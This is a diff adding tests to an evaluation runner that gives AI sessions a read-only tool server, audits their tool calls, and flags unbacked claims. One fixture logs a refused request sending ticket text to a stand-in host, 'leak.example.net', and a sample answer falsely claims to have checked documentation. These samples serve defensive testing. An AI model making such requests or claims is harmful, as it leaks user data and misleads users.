@@ -24,6 +24,7 @@ const test = require('node:test');
 const cli = require('../judged-eval.js');
 const cases = require('./cases.js');
 const calibrate = require('./calibrate.js');
+const backends = require('./backends.js');
 const { REPO_ROOT } = require('./paths.js');
 
 const CLI = path.join(__dirname, '..', 'judged-eval.js');
@@ -73,7 +74,8 @@ test('a dry run prints the plan and the estimate, exits 4, and starts no process
   assert.match(text, /system-under-test sessions: 8, turns: 9 \(1 follow-up turn/);
   assert.match(text, /judge sessions: 8/);
   assert.match(text, /about 22\.50 US dollars .*docs\/evidence\/runtime-smoke\.md\); judge cost is not in the estimate until measured/);
-  assert.match(text, /claude -p <ticket> --output-format stream-json --verbose --max-turns 24 --tools Read Grep Glob Agent --allowedTools Read Grep Glob Agent --disallowedTools Bash WebFetch WebSearch/);
+  // batch 12: the system under test loads the read-only aegis-tools server by default, so its four tools are allowed
+  assert.match(text, /claude -p <ticket> --output-format stream-json --verbose --max-turns 24 --tools Read Grep Glob Agent --allowedTools Read Grep Glob Agent mcp__aegis-tools__docs_fetch mcp__aegis-tools__net_dns mcp__aegis-tools__net_http mcp__aegis-tools__net_tls --disallowedTools Bash WebFetch WebSearch/);
   assert.match(text, /--tools "" --no-session-persistence/);
   assertNoCaseText(s.out);
 });
@@ -236,4 +238,149 @@ test('code review 1: the whole DEV file runs through the runner; the two setup c
     const call = sut.find((x) => x.prompt.includes(c.ticket.slice(0, 40)));
     assert.ok(call && call.prompt.includes('--- What the company runs ---') && call.prompt.includes(c.setup.slice(0, 30)), `${c.id} reached the session with its setup`);
   }
+});
+
+// Batch 12, tasks 2, 3, 6 and 13: each case records its lane, the mode its answer named against the one the case
+// expects, its tool calls by tool, the batch 12 rows, and the three new checks, which fail the case like any check.
+// Wrong implementations: a runner that records the expected mode as the named one; one that leaves the new checks out
+// of the verdict (the unbacked "I checked" below must fail the case); lanes taken from the platform.
+test('batch 12: a case records its lane, its mode against the expected one, its tool calls and the new checks', async (t) => {
+  const answer = ['Mode: Engineer answer', '## Engineer answer', '**Evidence read:** no evidence given; this is reasoning.', '**Hypotheses:**', '1. The record is stale. Test: read its TTL.', '2. The resolver caches it. Test: ask another resolver.', '**Recommendation:** lower the TTL before the change; the administrator applies it.', '**Blast radius:** one record; rollback is the old value; stop if the lookup fails.', '**Verify:** a lookup returns the new value.', '**Ask next:** which resolver do your users use?', '', "I checked Microsoft's documentation for this.", '', '```aegis-desk', 'Gate: none', '```'].join('\n');
+  const s = setup(t, { sut: { answer, tool_calls: [{ name: 'Read', input: { file_path: 'CLAUDE.md' } }] } });
+  const one = JSON.parse(G4_TEXT.split('\n')[0]);
+  one.expected.mode = 'engineer';
+  one.capability = 'networking';
+  fs.writeFileSync(s.copy, `${JSON.stringify(one)}\n`);
+  await cli.main(['run', '--cases', s.copy, '--execute', '--results-dir', s.results], s.io, s.deps);
+  const json = JSON.parse(fs.readFileSync(path.join(s.results, 'results.json'), 'utf8'));
+  const r = json.cases[0];
+  assert.equal(r.lane, 'networking');
+  assert.deepEqual(r.mode, { named: 'engineer', shown: 'engineer', expected: 'engineer', match: true });
+  assert.deepEqual(r.tool_call_counts, { Read: 1 });
+  const names = r.checks.map((c) => c.check);
+  for (const n of ['fix-card-fits', 'claims-match-calls', 'fetched-citations']) assert.ok(names.includes(n), n);
+  assert.equal(r.checks.find((c) => c.check === 'claims-match-calls').verdict, 'fail');
+  assert.equal(r.verdict, 'FAIL');
+  assert.ok(r.reasons.includes('check claims-match-calls fail'));
+  assert.ok(r.expert_rows.some((x) => x.check === 'answer-mode' && x.verdict === 'pass'));
+  assert.deepEqual([json.summary.measures.mode_match.numerator, json.summary.measures.mode_match.denominator], [1, 1]);
+  assert.match(fs.readFileSync(path.join(s.results, 'report.md'), 'utf8'), /## Per lane/);
+});
+
+// Batch 12, task 5: the judged runner loads the tool server by default, --no-tools turns it off, each case gets its own
+// audit file in the results folder, and the run records which tools each session had. Wrong implementations: a flag
+// that only changes the preview (the session's own arguments must lose the server too); a record of the tools asked
+// for instead of the ones the session's init event listed; one audit file shared across cases.
+test('batch 12, task 5: the tool server is on by default with an audit file per case, --no-tools turns it off, and the run records the tools each session had', async (t) => {
+  const listed = ['Read', 'Grep', 'Glob', 'Agent', 'mcp__aegis-tools__docs_fetch', 'mcp__aegis-tools__net_dns', 'mcp__aegis-tools__net_http', 'mcp__aegis-tools__net_tls'];
+  const on = setup(t, { sut: { init_tools: listed } });
+  fs.writeFileSync(on.copy, `${G4_TEXT.split('\n')[0]}\n`);
+  await cli.main(['run', '--cases', on.copy, '--execute', '--results-dir', on.results], on.io, on.deps);
+  const json = JSON.parse(fs.readFileSync(path.join(on.results, 'results.json'), 'utf8'));
+  assert.equal(json.config.tools, true);
+  assert.deepEqual(json.cases[0].sut.tools_available, listed);
+  assert.deepEqual(json.cases[0].sut.mcp_servers, [{ name: 'aegis-tools', status: 'connected' }]);
+  const sutCall = on.calls().find((c) => c.role === 'sut');
+  const cfg = JSON.parse(sutCall.args[sutCall.args.indexOf('--mcp-config') + 1]);
+  const audit = cfg.mcpServers['aegis-tools'].args[cfg.mcpServers['aegis-tools'].args.indexOf('--audit') + 1];
+  assert.equal(audit, path.join(on.results, `${JSON.parse(G4_TEXT.split('\n')[0]).id}-tool-audit.jsonl`));
+  assert.match(fs.readFileSync(path.join(on.results, 'report.md'), 'utf8'), /tool server on/);
+
+  const off = setup(t, { sut: { init_tools: ['Read', 'Grep', 'Glob', 'Agent'] } });
+  fs.writeFileSync(off.copy, `${G4_TEXT.split('\n')[0]}\n`);
+  await cli.main(['run', '--cases', off.copy, '--execute', '--results-dir', off.results, '--no-tools'], off.io, off.deps);
+  const offJson = JSON.parse(fs.readFileSync(path.join(off.results, 'results.json'), 'utf8'));
+  assert.equal(offJson.config.tools, false);
+  assert.ok(off.calls().filter((c) => c.role === 'sut').every((c) => !c.args.includes('--mcp-config') && !c.args.some((a) => /mcp__aegis-tools__/.test(a))));
+  assert.match(fs.readFileSync(path.join(off.results, 'report.md'), 'utf8'), /tool server off/);
+  const dry = setup(t);
+  await cli.main(['run', '--cases', dry.copy, '--no-tools'], dry.io, dry.deps);
+  assert.doesNotMatch(dry.out.join('\n'), /mcp__aegis-tools__|--mcp-config/);
+});
+
+// Batch 12d. EXPECTED DECISION (written before the code): each case's session gets a typed file of its own in the
+// results folder, <case>-typed.txt, named to the tool server by --typed; when the session starts it holds the case's
+// setup (as protect() left it, the way the session gets it), ticket and evidence, one per line, and none of the runner's
+// own words. --no-tools writes none. Wrong implementations it catches: one typed file shared by every case (a host typed
+// in one case would open in the next); a setup typed before protect() (an address the session never saw); the runner's
+// framing in the file; a typed file written when no server reads it.
+test('batch 12d: each case\'s typed file, in the results folder, holds its setup, ticket and evidence when its session starts', async (t) => {
+  const { protect } = require('../../ask-aegis.js');
+  const s = setup(t);
+  const one = JSON.parse(G4_TEXT.split('\n')[0]);
+  const at = '@';
+  Object.assign(one, { setup: `Okta and Google Workspace; the NOC is noc${at}example.com`, ticket: 'The page https://status.example.com/ is blank for everyone.', evidence: 'curl says 503 from edge.example.net', follow_up: '' });
+  fs.writeFileSync(s.copy, `${JSON.stringify(one)}\n`);
+  await cli.main(['run', '--cases', s.copy, '--execute', '--results-dir', s.results], s.io, s.deps);
+  const call = s.calls().find((c) => c.role === 'sut');
+  assert.equal(call.typed.file, path.join(s.results, `${one.id}-typed.txt`));
+  assert.equal(call.typed.text, `${protect(one.setup).text}\n${one.ticket}\n${one.evidence}\n`);
+  assert.ok(call.typed.text.includes('[USER@DOMAIN.COM]') && !call.typed.text.includes(`noc${at}example.com`), 'the setup as protect() left it');
+  if (process.platform !== 'win32') assert.equal(call.typed.mode, 0o600);
+  const off = setup(t);
+  fs.writeFileSync(off.copy, `${JSON.stringify(one)}\n`);
+  await cli.main(['run', '--cases', off.copy, '--execute', '--results-dir', off.results, '--no-tools'], off.io, off.deps);
+  assert.equal(fs.existsSync(path.join(off.results, `${one.id}-typed.txt`)), false);
+});
+
+// Batch 12d. EXPECTED DECISION (written before the code): each case's record in results.json holds tool_server, read
+// from the case's own audit file: calls, allowed (answered), refused (every decision that starts with refused_), other,
+// and refused_calls (tool, input as the audit keeps it, decision, reason); a case that did not run holds zeros, so a
+// per-lane or per-mode sum never meets a missing value. report.md's Cases table shows allowed / refused per case. Wrong
+// implementations it catches: counts taken from the session's stream (it does not say which refusal, or why); one
+// audit file read for every case; a report that shows the refused inputs (they may hold ticket text).
+test('batch 12d: each case records its tool server calls allowed and refused, with every refused call and its reason, and the report shows the counts', async (t) => {
+  const refusedEntry = { time: 't', tool: 'net_http', input: { url: 'https://leak.example.net/?d=ticket-text' }, decision: 'refused_out_of_scope', reason: 'https://leak.example.net/?d=ticket-text is out of scope: not listed, not typed', addresses: [], bytes: 0, duration_ms: 1 };
+  const redirectEntry = { time: 't', tool: 'net_http', input: { url: 'https://pypi.org/x' }, decision: 'refused_redirect', reason: 'redirect 1 to https://files.example.net/ is refused: out of scope', addresses: ['151.101.1.69'], bytes: 0, duration_ms: 2 };
+  const okEntry = { time: 't', tool: 'net_dns', input: { name: 'pypi.org', type: 'A' }, decision: 'ok', addresses: [], bytes: 0, duration_ms: 1 };
+  const s = setup(t, { sut: { audit_entries: [okEntry, refusedEntry, okEntry, redirectEntry] } });
+  fs.writeFileSync(s.copy, `${G4_TEXT.split('\n')[0]}\n`);
+  await cli.main(['run', '--cases', s.copy, '--execute', '--results-dir', s.results], s.io, s.deps);
+  const json = JSON.parse(fs.readFileSync(path.join(s.results, 'results.json'), 'utf8'));
+  const r = json.cases[0];
+  assert.deepEqual(r.tool_server, {
+    calls: 4, allowed: 2, refused: 2, other: 0,
+    refused_calls: [refusedEntry, redirectEntry].map((e) => ({ tool: e.tool, input: e.input, decision: e.decision, reason: e.reason })),
+  });
+  const md = fs.readFileSync(path.join(s.results, 'report.md'), 'utf8');
+  assert.ok(md.includes('| Case | Platform | Verdict | Score | Card words | Reasons | Tool server allowed / refused |'), md.slice(md.indexOf('## Cases')));
+  const row = md.split('\n').find((l) => l.startsWith(`| ${r.id} |`));
+  assert.match(row, /\| 2 \/ 2 \|$/);
+  assert.ok(!md.includes('leak.example.net'), 'the report shows counts, never the refused inputs');
+  // a case that did not run holds zeros
+  const capped = setup(t);
+  fs.writeFileSync(capped.copy, `${G4_TEXT.split('\n')[0]}\n`);
+  await cli.main(['run', '--cases', capped.copy, '--execute', '--results-dir', capped.results, '--budget-usd', '0.01'], capped.io, capped.deps);
+  const notRun = JSON.parse(fs.readFileSync(path.join(capped.results, 'results.json'), 'utf8')).cases[0];
+  assert.equal(notRun.verdict, 'INCONCLUSIVE');
+  assert.deepEqual(notRun.tool_server, { calls: 0, allowed: 0, refused: 0, other: 0, refused_calls: [] });
+});
+
+// Code review 2 of batch 12d, finding 5. Wrong implementation it catches: the earlier run's audit and typed files
+// cleared only when a case's session starts, so in a results folder used before, a case the run does not start (the
+// limit is reached) or whose prompt is too long keeps the earlier run's files, and its record or a tool that reads the
+// folder counts the earlier run's calls as its own.
+test('batch 12d: a case that does not start leaves no audit or typed file of an earlier run in the results folder', async (t) => {
+  const stale = `${JSON.stringify({ time: 't', tool: 'net_dns', input: { name: 'old.example.com', type: 'A' }, decision: 'ok', addresses: [], bytes: 0, duration_ms: 1 })}\n`;
+  const id = JSON.parse(G4_TEXT.split('\n')[0]).id;
+  const seed = (s) => {
+    fs.mkdirSync(s.results, { recursive: true });
+    fs.writeFileSync(path.join(s.results, `${id}-tool-audit.jsonl`), stale);
+    fs.writeFileSync(path.join(s.results, `${id}-typed.txt`), 'old.example.com\n');
+  };
+  // not run: the limit is reached before the first case
+  const capped = setup(t);
+  fs.writeFileSync(capped.copy, `${G4_TEXT.split('\n')[0]}\n`);
+  seed(capped);
+  await cli.main(['run', '--cases', capped.copy, '--execute', '--results-dir', capped.results, '--budget-usd', '0.01'], capped.io, capped.deps);
+  assert.equal(JSON.parse(fs.readFileSync(path.join(capped.results, 'results.json'), 'utf8')).cases[0].verdict, 'INCONCLUSIVE');
+  assert.deepEqual(fs.readdirSync(capped.results).filter((f) => f.startsWith(`${id}-`)), [], 'the earlier run\'s files are gone');
+  // a prompt too long for one argument: runSut returns before any session, and the record holds no earlier call
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-too-long-'));
+  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
+  const auditFile = path.join(dir, 'B1-tool-audit.jsonl');
+  fs.writeFileSync(auditFile, stale);
+  const sut = await backends.runSut({ id: 'B1', ticket: 'x'.repeat(backends.MAX_PROMPT_BYTES + 10), evidence: '', follow_up: '' }, { command: process.execPath, prefixArgs: [], repoRoot: REPO_ROOT, auditFile });
+  assert.equal(sut.state, 'ERROR');
+  assert.deepEqual(backends.toolServerRecord(auditFile).calls, 0);
 });
